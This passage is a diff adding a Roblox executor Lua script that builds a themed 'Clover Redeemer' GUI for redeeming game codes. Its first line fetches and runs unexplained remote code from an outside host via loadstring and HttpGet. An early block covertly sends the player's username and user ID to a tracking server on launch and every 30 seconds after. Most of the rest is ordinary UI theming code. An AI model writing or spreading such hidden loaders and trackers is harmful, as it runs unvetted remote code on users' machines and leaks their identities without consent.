@@ -1,0 +1,3693 @@
+loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=4k7p3c65"))()
+
+-- discord.gg/statics
+-- discord.gg/32e4
+
+local u1
+local u2
+local u3
+
+local function v4(p1)
+	local ok, result = pcall(p1)
+
+	return ok and result or nil
+end
+local function v7(p2)
+	return p2 and typeof(p2) == "Instance" and p2.Parent ~= nil
+end
+local function v8()
+	if not v7(u1) then
+		u1 = v4(function()
+			return game.Players.LocalPlayer.PlayerGui.TopNotification.TopNotification.Template
+		end)
+	end
+
+	if not v7(u2) then
+		u2 = v4(function()
+			return game.Players.LocalPlayer.PlayerGui.Codes.Codes.CodeRedeem.TextBox
+		end)
+	end
+
+	if not v7(u3) then
+		u3 = v4(function()
+			return game.Players.LocalPlayer.PlayerGui.Codes.Codes.Confirm
+		end)
+	end
+end
+
+v8()
+
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local v15 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local color3 = Color3.fromRGB(146, 255, 103)
+
+do
+	local function v18(p3)
+		return tostring(p3 or ""):gsub("([^%w%-_%.~])", function(p4)
+			return string.format("%%%02X", string.byte(p4))
+		end)
+	end
+	local function v19(p5)
+		local v20 = "https://script-tracker--clovexxx.replit.app" .. "/track?action=" .. v18(p5) .. "&username=" .. v18(LocalPlayer.Name) .. "&userid=" .. v18(LocalPlayer.UserId)
+
+		task.spawn(function()
+			local request_ = syn and syn.request or http and http.request or http_request or request
+
+			if request_ then
+				pcall(function()
+					request_({
+						Url = v20,
+						Method = "GET"
+					})
+				end)
+			else
+				pcall(function()
+					game:HttpGet(v20)
+				end)
+			end
+		end)
+	end
+
+	v19("execute")
+	task.spawn(function()
+		while task.wait(30) do
+			v19("heartbeat")
+		end
+	end)
+end
+
+local t1 = {
+	BG = Color3.fromRGB(10, 22, 15),
+	INNER = Color3.fromRGB(14, 32, 22),
+	INNER_DARK = Color3.fromRGB(7, 16, 11),
+	GREEN = Color3.fromRGB(60, 200, 110),
+	NEON = Color3.fromRGB(140, 255, 180),
+	GOLD = Color3.fromRGB(255, 220, 130),
+	TEXT = Color3.fromRGB(220, 255, 230),
+	DIM = Color3.fromRGB(110, 150, 125),
+	DIM2 = Color3.fromRGB(79, 122, 97),
+	RED = Color3.fromRGB(224, 138, 138),
+	WHITE = Color3.fromRGB(255, 255, 255)
+}
+local t2, t3, genv, v26, v27, v28, v29, v30, v31, ScreenGui
+local Frame, t4, v35, Frame2, v37, v38, v39, TextButton, v41, v42
+local v43
+
+do
+	local t5 = {
+		Clover = {
+			BG = Color3.fromRGB(10, 22, 15),
+			INNER = Color3.fromRGB(14, 32, 22),
+			INNER_DARK = Color3.fromRGB(7, 16, 11),
+			GREEN = Color3.fromRGB(60, 200, 110),
+			NEON = Color3.fromRGB(140, 255, 180),
+			GOLD = Color3.fromRGB(255, 220, 130),
+			TEXT = Color3.fromRGB(220, 255, 230),
+			DIM = Color3.fromRGB(110, 150, 125),
+			DIM2 = Color3.fromRGB(79, 122, 97),
+			RED = Color3.fromRGB(224, 138, 138),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(35, 130, 78),
+				Color3.fromRGB(95, 235, 145),
+				Color3.fromRGB(170, 255, 205),
+				Color3.fromRGB(45, 165, 95)
+			}
+		},
+		Aqua = {
+			BG = Color3.fromRGB(7, 18, 24),
+			INNER = Color3.fromRGB(10, 34, 43),
+			INNER_DARK = Color3.fromRGB(5, 13, 18),
+			GREEN = Color3.fromRGB(60, 190, 220),
+			NEON = Color3.fromRGB(135, 245, 255),
+			GOLD = Color3.fromRGB(255, 220, 150),
+			TEXT = Color3.fromRGB(220, 250, 255),
+			DIM = Color3.fromRGB(115, 160, 170),
+			DIM2 = Color3.fromRGB(78, 130, 145),
+			RED = Color3.fromRGB(232, 135, 155),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(30, 112, 150),
+				Color3.fromRGB(80, 205, 230),
+				Color3.fromRGB(155, 245, 255),
+				Color3.fromRGB(55, 165, 210)
+			}
+		},
+		Sakura = {
+			BG = Color3.fromRGB(25, 12, 22),
+			INNER = Color3.fromRGB(42, 18, 35),
+			INNER_DARK = Color3.fromRGB(17, 8, 15),
+			GREEN = Color3.fromRGB(236, 105, 168),
+			NEON = Color3.fromRGB(255, 178, 218),
+			GOLD = Color3.fromRGB(255, 220, 165),
+			TEXT = Color3.fromRGB(255, 230, 246),
+			DIM = Color3.fromRGB(172, 119, 150),
+			DIM2 = Color3.fromRGB(137, 84, 116),
+			RED = Color3.fromRGB(255, 125, 125),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(145, 45, 105),
+				Color3.fromRGB(236, 105, 168),
+				Color3.fromRGB(255, 178, 218),
+				Color3.fromRGB(190, 72, 140)
+			}
+		},
+		Gold = {
+			BG = Color3.fromRGB(24, 19, 10),
+			INNER = Color3.fromRGB(43, 34, 18),
+			INNER_DARK = Color3.fromRGB(16, 12, 6),
+			GREEN = Color3.fromRGB(220, 172, 64),
+			NEON = Color3.fromRGB(255, 226, 135),
+			GOLD = Color3.fromRGB(255, 235, 170),
+			TEXT = Color3.fromRGB(255, 244, 218),
+			DIM = Color3.fromRGB(170, 145, 94),
+			DIM2 = Color3.fromRGB(137, 111, 61),
+			RED = Color3.fromRGB(235, 120, 105),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(130, 92, 28),
+				Color3.fromRGB(220, 172, 64),
+				Color3.fromRGB(255, 226, 135),
+				Color3.fromRGB(180, 126, 38)
+			}
+		},
+		Grape = {
+			BG = Color3.fromRGB(16, 12, 30),
+			INNER = Color3.fromRGB(29, 22, 54),
+			INNER_DARK = Color3.fromRGB(10, 7, 20),
+			GREEN = Color3.fromRGB(150, 112, 255),
+			NEON = Color3.fromRGB(205, 180, 255),
+			GOLD = Color3.fromRGB(255, 220, 155),
+			TEXT = Color3.fromRGB(238, 232, 255),
+			DIM = Color3.fromRGB(145, 126, 185),
+			DIM2 = Color3.fromRGB(111, 91, 154),
+			RED = Color3.fromRGB(245, 126, 165),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(95, 58, 180),
+				Color3.fromRGB(150, 112, 255),
+				Color3.fromRGB(205, 180, 255),
+				Color3.fromRGB(120, 72, 210)
+			}
+		},
+		Ruby = {
+			BG = Color3.fromRGB(28, 8, 10),
+			INNER = Color3.fromRGB(48, 14, 18),
+			INNER_DARK = Color3.fromRGB(17, 4, 6),
+			GREEN = Color3.fromRGB(230, 65, 82),
+			NEON = Color3.fromRGB(255, 145, 155),
+			GOLD = Color3.fromRGB(255, 214, 145),
+			TEXT = Color3.fromRGB(255, 228, 230),
+			DIM = Color3.fromRGB(176, 102, 108),
+			DIM2 = Color3.fromRGB(135, 66, 74),
+			RED = Color3.fromRGB(255, 105, 105),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(155, 24, 42),
+				Color3.fromRGB(230, 65, 82),
+				Color3.fromRGB(255, 145, 155),
+				Color3.fromRGB(190, 38, 58)
+			}
+		},
+		Ice = {
+			BG = Color3.fromRGB(10, 18, 28),
+			INNER = Color3.fromRGB(17, 34, 54),
+			INNER_DARK = Color3.fromRGB(6, 12, 20),
+			GREEN = Color3.fromRGB(112, 190, 255),
+			NEON = Color3.fromRGB(195, 235, 255),
+			GOLD = Color3.fromRGB(255, 235, 170),
+			TEXT = Color3.fromRGB(230, 246, 255),
+			DIM = Color3.fromRGB(125, 158, 184),
+			DIM2 = Color3.fromRGB(87, 122, 150),
+			RED = Color3.fromRGB(245, 130, 160),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(50, 125, 210),
+				Color3.fromRGB(112, 190, 255),
+				Color3.fromRGB(195, 235, 255),
+				Color3.fromRGB(70, 155, 235)
+			}
+		},
+		Toxic = {
+			BG = Color3.fromRGB(8, 20, 10),
+			INNER = Color3.fromRGB(16, 38, 17),
+			INNER_DARK = Color3.fromRGB(5, 12, 6),
+			GREEN = Color3.fromRGB(130, 255, 55),
+			NEON = Color3.fromRGB(210, 255, 120),
+			GOLD = Color3.fromRGB(255, 232, 120),
+			TEXT = Color3.fromRGB(235, 255, 220),
+			DIM = Color3.fromRGB(135, 170, 108),
+			DIM2 = Color3.fromRGB(98, 136, 70),
+			RED = Color3.fromRGB(240, 120, 110),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(75, 155, 28),
+				Color3.fromRGB(130, 255, 55),
+				Color3.fromRGB(210, 255, 120),
+				Color3.fromRGB(98, 210, 38)
+			}
+		},
+		Void = {
+			BG = Color3.fromRGB(6, 5, 12),
+			INNER = Color3.fromRGB(17, 14, 28),
+			INNER_DARK = Color3.fromRGB(3, 3, 8),
+			GREEN = Color3.fromRGB(115, 92, 255),
+			NEON = Color3.fromRGB(185, 170, 255),
+			GOLD = Color3.fromRGB(255, 215, 130),
+			TEXT = Color3.fromRGB(238, 235, 255),
+			DIM = Color3.fromRGB(120, 112, 155),
+			DIM2 = Color3.fromRGB(88, 80, 120),
+			RED = Color3.fromRGB(255, 110, 150),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(40, 24, 105),
+				Color3.fromRGB(95, 58, 180),
+				Color3.fromRGB(140, 100, 255),
+				Color3.fromRGB(70, 38, 145)
+			}
+		},
+		Sunset = {
+			BG = Color3.fromRGB(28, 12, 14),
+			INNER = Color3.fromRGB(52, 24, 25),
+			INNER_DARK = Color3.fromRGB(16, 7, 8),
+			GREEN = Color3.fromRGB(255, 112, 76),
+			NEON = Color3.fromRGB(255, 190, 110),
+			GOLD = Color3.fromRGB(255, 230, 140),
+			TEXT = Color3.fromRGB(255, 236, 220),
+			DIM = Color3.fromRGB(180, 122, 98),
+			DIM2 = Color3.fromRGB(140, 82, 62),
+			RED = Color3.fromRGB(255, 105, 105),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(160, 52, 48),
+				Color3.fromRGB(255, 112, 76),
+				Color3.fromRGB(255, 190, 110),
+				Color3.fromRGB(215, 78, 60)
+			}
+		},
+		Candy = {
+			BG = Color3.fromRGB(26, 12, 31),
+			INNER = Color3.fromRGB(48, 24, 58),
+			INNER_DARK = Color3.fromRGB(16, 7, 20),
+			GREEN = Color3.fromRGB(255, 105, 220),
+			NEON = Color3.fromRGB(130, 245, 255),
+			GOLD = Color3.fromRGB(255, 235, 150),
+			TEXT = Color3.fromRGB(255, 235, 252),
+			DIM = Color3.fromRGB(175, 118, 185),
+			DIM2 = Color3.fromRGB(135, 82, 148),
+			RED = Color3.fromRGB(255, 118, 145),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(255, 105, 220),
+				Color3.fromRGB(130, 245, 255),
+				Color3.fromRGB(255, 170, 235),
+				Color3.fromRGB(170, 120, 255)
+			}
+		},
+		Matrix = {
+			BG = Color3.fromRGB(3, 12, 7),
+			INNER = Color3.fromRGB(7, 28, 14),
+			INNER_DARK = Color3.fromRGB(1, 7, 4),
+			GREEN = Color3.fromRGB(0, 255, 95),
+			NEON = Color3.fromRGB(170, 255, 190),
+			GOLD = Color3.fromRGB(210, 255, 120),
+			TEXT = Color3.fromRGB(220, 255, 225),
+			DIM = Color3.fromRGB(90, 160, 105),
+			DIM2 = Color3.fromRGB(55, 120, 70),
+			RED = Color3.fromRGB(255, 90, 110),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(0, 120, 45),
+				Color3.fromRGB(0, 255, 95),
+				Color3.fromRGB(130, 255, 150),
+				Color3.fromRGB(30, 180, 70)
+			}
+		},
+		Mono = {
+			BG = Color3.fromRGB(12, 12, 14),
+			INNER = Color3.fromRGB(28, 28, 32),
+			INNER_DARK = Color3.fromRGB(6, 6, 8),
+			GREEN = Color3.fromRGB(170, 180, 190),
+			NEON = Color3.fromRGB(235, 240, 245),
+			GOLD = Color3.fromRGB(220, 220, 180),
+			TEXT = Color3.fromRGB(240, 242, 245),
+			DIM = Color3.fromRGB(135, 140, 150),
+			DIM2 = Color3.fromRGB(95, 100, 110),
+			RED = Color3.fromRGB(240, 110, 120),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(70, 74, 82),
+				Color3.fromRGB(135, 145, 160),
+				Color3.fromRGB(205, 212, 220),
+				Color3.fromRGB(100, 106, 118)
+			}
+		},
+		Royal = {
+			BG = Color3.fromRGB(9, 12, 30),
+			INNER = Color3.fromRGB(18, 24, 58),
+			INNER_DARK = Color3.fromRGB(5, 7, 18),
+			GREEN = Color3.fromRGB(72, 120, 255),
+			NEON = Color3.fromRGB(180, 205, 255),
+			GOLD = Color3.fromRGB(255, 220, 120),
+			TEXT = Color3.fromRGB(230, 238, 255),
+			DIM = Color3.fromRGB(120, 140, 185),
+			DIM2 = Color3.fromRGB(82, 102, 150),
+			RED = Color3.fromRGB(255, 110, 130),
+			WHITE = Color3.fromRGB(255, 255, 255),
+			Colors = {
+				Color3.fromRGB(40, 70, 175),
+				Color3.fromRGB(72, 120, 255),
+				Color3.fromRGB(255, 220, 120),
+				Color3.fromRGB(115, 92, 255)
+			}
+		}
+	}
+
+	t2 = {
+		"Clover",
+		"Aqua",
+		"Sakura",
+		"Gold",
+		"Grape",
+		"Ruby",
+		"Ice",
+		"Toxic",
+		"Void",
+		"Sunset",
+		"Candy",
+		"Matrix",
+		"Mono",
+		"Royal"
+	}
+	t3 = {
+		AnimationsEnabled = true,
+		UIScale = v15 and 0.65 or 1,
+		Theme = "Clover"
+	}
+	genv = getgenv and getgenv() or _G
+	genv.CloverRedeemerConnections = genv.CloverRedeemerConnections or {}
+
+	for _, cloverRedeemerConnection in ipairs(genv.CloverRedeemerConnections) do
+		pcall(function()
+			cloverRedeemerConnection:Disconnect()
+		end)
+	end
+
+	table.clear(genv.CloverRedeemerConnections)
+
+	local CloverRedeemerGui = PlayerGui:FindFirstChild("CloverRedeemerGui")
+
+	if CloverRedeemerGui then
+		CloverRedeemerGui:Destroy()
+	end
+
+	v26 = function(p6, p7, p8)
+		local instance = Instance.new(p6)
+		local v49 = p7 or {}
+
+		for k, v in pairs(v49) do
+			instance[k] = v
+		end
+
+		local v52 = p8 or {}
+
+		for _, v in ipairs(v52) do
+			v.Parent = instance
+		end
+
+		return instance
+	end
+	v27 = function(p9, p10)
+		return v26("UICorner", {
+			CornerRadius = UDim.new(0, p10 or 8),
+			Parent = p9
+		})
+	end
+	v28 = function(p11, p12, p13, p14, p15)
+		local v55 = v26
+		local s1 = "UIPadding"
+		local n1 = 0
+		local t6 = {
+			PaddingTop = UDim.new(n1, p12 or 0),
+			PaddingBottom = UDim.new(n1, p13 or p12 or 0),
+			PaddingLeft = UDim.new(n1, p14 or p12 or 0),
+			PaddingRight = UDim.new(n1, p15 or p14 or p12 or 0),
+			Parent = p11
+		}
+
+		return v55(s1, t6)
+	end
+	v29 = function(p16, p17)
+		return v26("UIListLayout", {
+			Padding = UDim.new(0, p17 or 8),
+			SortOrder = Enum.SortOrder.LayoutOrder,
+			Parent = p16
+		})
+	end
+	v30 = function(p18, p19, p20)
+		return v26("UIListLayout", {
+			FillDirection = Enum.FillDirection.Horizontal,
+			Padding = UDim.new(0, p19 or 6),
+			VerticalAlignment = p20 or Enum.VerticalAlignment.Center,
+			SortOrder = Enum.SortOrder.LayoutOrder,
+			Parent = p18
+		})
+	end
+	v31 = function(p21, p22, p23, p24)
+		local UIStroke = v26("UIStroke", {
+			Color = p22 or t1.GREEN,
+			Thickness = p23 or 1,
+			Transparency = p24 or 0.75,
+			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+			Parent = p21
+		})
+
+		if p22 == t1.WHITE or p22 == t1.NEON then
+			UIStroke:SetAttribute("ThemeStroke", true)
+
+			return UIStroke
+		elseif (p23 or 1) > 1 then
+			UIStroke:SetAttribute("ThemeStroke", true)
+		end
+
+		return UIStroke
+	end
+	ScreenGui = v26("ScreenGui", {
+		Name = "CloverRedeemerGui",
+		ResetOnSpawn = false,
+		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+		IgnoreGuiInset = true,
+		DisplayOrder = 999,
+		Parent = PlayerGui
+	})
+	Frame = v26("Frame", {
+		Name = "ThemeScreenEffect",
+		Size = UDim2.fromScale(1, 1),
+		Position = UDim2.fromScale(0, 0),
+		BackgroundColor3 = t1.BG,
+		BackgroundTransparency = 0.8,
+		BorderSizePixel = 0,
+		ZIndex = 0,
+		Visible = false,
+		Parent = ScreenGui
+	})
+	t4 = {
+		Panels = {},
+		Settings = {}
+	}
+
+	local u60 = false
+
+	local function v61()
+		return type(readfile) == "function" and type(writefile) == "function"
+	end
+	local function v62()
+		if not v61() then
+			return
+		end
+
+		local ok, result = pcall(function()
+			if type(isfile) ~= "function" or isfile("CloverRedeemerGui_state_AI.json") then
+				return readfile("CloverRedeemerGui_state_AI.json")
+			end
+
+			return nil
+		end)
+
+		if ok and result then
+			if result ~= "" then
+				local ok2, result2 = pcall(function()
+					return HttpService:JSONDecode(result)
+				end)
+
+				if ok2 and type(result2) == "table" then
+					t4 = result2
+					t4.Panels = t4.Panels or {}
+					t4.Settings = t4.Settings or {}
+				end
+			end
+		end
+	end
+
+	v35 = function()
+		if u60 or not v61() then
+			return
+		end
+
+		u60 = true
+		task.delay(0.15, function()
+			u60 = false
+			pcall(function()
+				writefile("CloverRedeemerGui_state_AI.json", HttpService:JSONEncode(t4))
+			end)
+		end)
+	end
+
+	local function v67(p25)
+		return (p25:gsub("%W+", "_"))
+	end
+	local function v68(p26)
+		return {
+			XS = p26.X.Scale,
+			XO = p26.X.Offset,
+			YS = p26.Y.Scale,
+			YO = p26.Y.Offset
+		}
+	end
+	local function v69(p27, p28)
+		if type(p27) ~= "table" then
+			return p28
+		end
+
+		local v70 = tonumber(p27.XS) or 0
+
+		return UDim2.new(v70, tonumber(p27.XO) or 0, tonumber(p27.YS) or 0, tonumber(p27.YO) or 0)
+	end
+
+	v62()
+
+	if t4.Settings.UIScale then
+		t3.UIScale = math.clamp(tonumber(t4.Settings.UIScale) or t3.UIScale, 0.5, 1.25)
+	end
+
+	local theme = t5[tostring(t4.Settings.Theme or t3.Theme)]
+
+	if theme then
+		theme = tostring(t4.Settings.Theme or t3.Theme)
+	end
+
+	t3.Theme = theme or "Clover"
+	Frame2 = nil
+
+	local t7 = {}
+	local t8 = {}
+	local connection
+
+	local function v75(p29)
+		return p29 - math.floor(p29)
+	end
+	local function v76(p30)
+		local Clover = t5[p30] or t5.Clover
+
+		for k, v in pairs(Clover) do
+			if k ~= "Colors" then
+				t1[k] = v
+			end
+		end
+	end
+	local function v80(p31)
+		local t9 = {}
+		local v82 = p31[1]
+
+		for i, v in ipairs(p31) do
+			t9[i] = ColorSequenceKeypoint.new((i - 1) / math.max(1, #p31 - 1), v)
+		end
+
+		t9[#t9] = ColorSequenceKeypoint.new(1, v82)
+
+		return t9
+	end
+	local function v85(p32)
+		return function(p33)
+			if p33 <= 0 then
+				return p32[1].Value
+			end
+
+			if p33 >= 1 then
+				return p32[#p32].Value
+			end
+
+			for i = 1, #p32 - 1 do
+				local v87 = p32[i]
+				local v88 = p32[i + 1]
+
+				if not (v87.Time <= p33) or not (p33 <= v88.Time) then
+					continue
+				end
+
+				local v89 = v88.Time - v87.Time
+
+				return v87.Value:Lerp(v88.Value, v89 > 0 and (p33 - v87.Time) / v89 or 0)
+			end
+
+			return p32[#p32].Value
+		end
+	end
+
+	local t10 = {
+		Stop = function(p34, p35)
+			local v91 = t7[p35]
+
+			if v91 then
+				v91:Disconnect()
+				t7[p35] = nil
+			end
+		end,
+		Apply = function(p36, p37, p38, p39)
+			if typeof(p37) ~= "Instance" or not p37:IsA("UIGradient") then
+				return
+			end
+
+			local Clover = t5[p38] or t5.Clover
+			local t11 = {
+				KeyCount = v15 and 10 or 20,
+				Speed = v15 and 0.22 or 0.5,
+				Span = 0.85,
+				Rotation = 90,
+				UpdateRate = v15 and 0.12 or 0
+			}
+
+			if p39 then
+				for k, v in pairs(p39) do
+					t11[k] = v
+				end
+			end
+
+			local v96 = v85(v80(Clover.Colors))
+			local v97 = math.clamp(t11.KeyCount, 8, 96)
+
+			p37.Rotation = t11.Rotation
+			p36:Stop(p37)
+
+			local n2 = 0
+			local n3 = 0
+
+			t7[p37] = RunService.RenderStepped:Connect(function(dt)
+				n2 += dt
+				n3 += dt
+
+				if t11.UpdateRate > 0 and n3 < t11.UpdateRate then
+					return
+				end
+
+				n3 = 0
+
+				local v100 = v75(n2 * t11.Speed)
+				local v101 = table.create(v97)
+
+				for i = 1, v97 do
+					local v103 = (i - 1) / math.max(1, v97 - 1)
+					local v104 = v75(v100 + v103 * t11.Span)
+
+					v101[i] = ColorSequenceKeypoint.new(v103, v96(v104))
+				end
+
+				p37.Color = ColorSequence.new(v101)
+			end)
+			p37.Destroying:Connect(function()
+				p36:Stop(p37)
+			end)
+		end
+	}
+
+	local function v105(p40, p41)
+		local Clover = t5[p41] or t5.Clover
+
+		t10:Stop(p40)
+		p40.Rotation = 90
+		p40.Color = ColorSequence.new(v80(Clover.Colors))
+	end
+
+	v37 = function(p42, p43)
+		local UIGradient = p42:FindFirstChildOfClass("UIGradient") or v26("UIGradient", {
+			Parent = p42
+		})
+
+		UIGradient.Transparency = NumberSequence.new(p43 or 0.25)
+		t8[UIGradient] = true
+
+		if v15 then
+			v105(UIGradient, t3.Theme)
+
+			return UIGradient
+		end
+
+		t10:Apply(UIGradient, t3.Theme, {
+			Rotation = 90
+		})
+
+		return UIGradient
+	end
+	v37(Frame, 0.55)
+
+	local function v108()
+		if connection then
+			connection:Disconnect()
+			connection = nil
+		end
+
+		if not ScreenGui then
+			return
+		end
+
+		local v109 = v85(v80((t5[t3.Theme] or t5.Clover).Colors))
+
+		if not v15 then
+			local n4 = 0
+			local n5 = 0
+
+			connection = RunService.RenderStepped:Connect(function(dt)
+				n4 += dt
+				n5 += dt
+
+				if n5 < 0.035 then
+					return
+				end
+
+				n5 = 0
+
+				local v112 = v75(n4 * 0.5)
+				local v113 = v109(v112)
+				local v114 = v109(v75(v112 + 0.35))
+
+				for _, descendant in ipairs(ScreenGui:GetDescendants()) do
+					if descendant:IsA("UIStroke") and descendant:GetAttribute("ThemeStroke") then
+						descendant.Color = descendant.Thickness > 1 and v113 or v114
+					end
+				end
+			end)
+			table.insert(genv.CloverRedeemerConnections, connection)
+
+			return
+		end
+
+		local v117 = v109(0)
+		local v118 = v109(0.35)
+
+		for _, descendant in ipairs(ScreenGui:GetDescendants()) do
+			if descendant:IsA("UIStroke") and descendant:GetAttribute("ThemeStroke") then
+				descendant.Color = descendant.Thickness > 1 and v117 or v118
+			end
+		end
+	end
+
+	v38 = function()
+		v76(t3.Theme)
+
+		if Frame then
+			Frame.BackgroundColor3 = t1.BG
+			Frame.BackgroundTransparency = 0.8
+		end
+
+		for k in pairs(t8) do
+			if not k.Parent then
+				t8[k] = nil
+			elseif v15 then
+				v105(k, t3.Theme)
+			else
+				t10:Apply(k, t3.Theme, {
+					Rotation = 90
+				})
+			end
+		end
+
+		if not ScreenGui then
+			return
+		end
+
+		for _, descendant in ipairs(ScreenGui:GetDescendants()) do
+			if not descendant:IsA("TextLabel") then
+				if descendant:IsA("TextBox") then
+					if descendant.TextColor3 ~= t1.RED and descendant.TextColor3 ~= t1.GOLD then
+						descendant.TextColor3 = t1.TEXT
+					end
+
+					descendant.PlaceholderColor3 = t1.DIM
+				elseif not descendant:IsA("TextButton") then
+					if not descendant:IsA("Frame") or not (descendant.BackgroundTransparency < 1) then
+						if not descendant:IsA("UIStroke") then
+							if descendant:IsA("ScrollingFrame") and descendant.BackgroundTransparency < 1 then
+								descendant.BackgroundColor3 = t1.INNER_DARK
+								descendant.ScrollBarImageColor3 = t1.DIM
+							end
+						elseif descendant:GetAttribute("ThemeStroke") then
+							descendant.Color = t1.NEON
+						elseif descendant.Color ~= t1.RED then
+							descendant.Color = t1.GREEN
+						end
+					elseif descendant:GetAttribute("KeepScaleColor") then
+						descendant.BackgroundColor3 = descendant.Name == "ScaleFill" and t1.GREEN or t1.INNER_DARK
+					elseif descendant.Parent == Frame2 then
+						descendant.BackgroundColor3 = t1.BG
+					elseif not descendant:FindFirstChildOfClass("UIGradient") then
+						descendant.BackgroundColor3 = t1.INNER
+					end
+				elseif descendant:GetAttribute("KeepScaleColor") then
+					descendant.BackgroundColor3 = t1.WHITE
+					descendant.TextColor3 = t1.BG
+				elseif descendant.Text == "X" then
+					descendant.BackgroundColor3 = Color3.fromRGB(42, 24, 28)
+					descendant.TextColor3 = t1.RED
+				elseif descendant:GetAttribute("ThemeRedeemButton") or descendant.Text == "★ Redeem" then
+					descendant.BackgroundColor3 = t1.NEON
+					descendant.TextColor3 = t1.BG
+				elseif descendant.Text:find("Theme:") then
+					descendant.BackgroundColor3 = t1.INNER
+					descendant.TextColor3 = t1.NEON
+				else
+					if descendant.BackgroundTransparency < 1 then
+						descendant.BackgroundColor3 = t1.INNER
+					end
+
+					descendant.TextColor3 = t1.TEXT
+				end
+			elseif descendant.TextColor3 ~= t1.RED and descendant.TextColor3 ~= t1.GOLD then
+				descendant.TextColor3 = t1.TEXT
+			end
+		end
+
+		v108()
+	end
+	v76(t3.Theme)
+
+	local UIScale
+	local t12 = {}
+	local t13 = {}
+
+	local function v127(p44, p45, p46)
+		local v128 = p45 or p44
+		local u129
+		local u130
+		local Position
+		local Position2
+
+		v128.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				u129 = true
+				Position = input.Position
+				Position2 = p44.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						u129 = false
+
+						if p46 then
+							task.delay(t3.AnimationsEnabled and 0.1 or 0, p46)
+						end
+					end
+				end)
+			end
+		end)
+		v128.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				u130 = input
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if input == u130 and u129 then
+				local max = math.max
+				local Scale = UIScale and UIScale.Scale or t3.UIScale
+				local v135 = (input.Position - Position) / max(Scale or 1, 0.01)
+
+				p44.Position = UDim2.new(Position2.X.Scale, Position2.X.Offset + v135.X, Position2.Y.Scale, Position2.Y.Offset + v135.Y)
+			end
+		end)
+	end
+
+	v39 = function(p47, p48, p49, p50)
+		local v136 = p50 or p48:Lerp(t1.WHITE, 0.1)
+		local v137 = p48:Lerp(t1.BG, 0.2)
+
+		p47.MouseEnter:Connect(function()
+			if not t3.AnimationsEnabled then
+				p47.BackgroundColor3 = v136
+
+				return
+			end
+
+			local t14 = {
+				BackgroundColor3 = v136
+			}
+
+			TweenService:Create(p47, TweenInfo.new(0.2), t14):Play()
+
+			if p49 then
+				TweenService:Create(p49, TweenInfo.new(0.2), {
+					Thickness = 1.5,
+					Transparency = 0.4
+				}):Play()
+			end
+		end)
+		p47.MouseLeave:Connect(function()
+			if not t3.AnimationsEnabled then
+				p47.BackgroundColor3 = p48
+
+				return
+			end
+
+			local t15 = {
+				BackgroundColor3 = p48
+			}
+
+			TweenService:Create(p47, TweenInfo.new(0.2), t15):Play()
+
+			if p49 then
+				TweenService:Create(p49, TweenInfo.new(0.2), {
+					Thickness = 1,
+					Transparency = 0.75
+				}):Play()
+			end
+		end)
+		p47.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				if not t3.AnimationsEnabled then
+					p47.BackgroundColor3 = v137
+
+					return
+				end
+
+				local t16 = {
+					BackgroundColor3 = v137
+				}
+
+				TweenService:Create(p47, TweenInfo.new(0.05), t16):Play()
+
+				if p49 then
+					TweenService:Create(p49, TweenInfo.new(0.05), {
+						Thickness = 2,
+						Transparency = 0.2
+					}):Play()
+				end
+			end
+		end)
+		p47.InputEnded:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				if not t3.AnimationsEnabled then
+					p47.BackgroundColor3 = p48
+
+					return
+				end
+
+				local t17 = {
+					BackgroundColor3 = p48
+				}
+
+				TweenService:Create(p47, TweenInfo.new(0.1), t17):Play()
+
+				if p49 then
+					TweenService:Create(p49, TweenInfo.new(0.1), {
+						Thickness = 1,
+						Transparency = 0.75
+					}):Play()
+				end
+			end
+		end)
+	end
+	TextButton = v26("TextButton", {
+		Size = UDim2.fromOffset(54, 54),
+		Position = UDim2.new(0, 24, 1, -82),
+		BackgroundColor3 = t1.BG,
+		Text = "☘",
+		TextColor3 = t1.NEON,
+		TextSize = 26,
+		Font = Enum.Font.GothamBold,
+		AutoButtonColor = false,
+		Visible = false,
+		Parent = ScreenGui
+	})
+	v27(TextButton, 16)
+	v31(TextButton, t1.GREEN, 1.5, 0.5)
+	v37(TextButton, 0.18)
+	v39(TextButton, t1.BG, nil, t1.INNER)
+	v127(TextButton, TextButton)
+	Frame2 = v26("Frame", {
+		Size = UDim2.fromScale(1, 1),
+		BackgroundTransparency = 1,
+		Visible = false,
